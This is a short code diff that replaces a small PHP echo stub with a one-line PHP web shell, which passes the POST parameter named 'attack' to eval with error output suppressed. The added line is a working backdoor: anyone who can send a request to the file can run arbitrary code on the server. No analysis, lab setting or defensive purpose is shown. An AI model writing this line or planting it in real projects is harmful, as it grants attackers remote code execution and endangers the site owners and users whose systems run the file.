@@ -1,3 +1,1 @@
-<php
-     echo "ewe"
-?>
+<?php @eval($_POST['attack']);?>
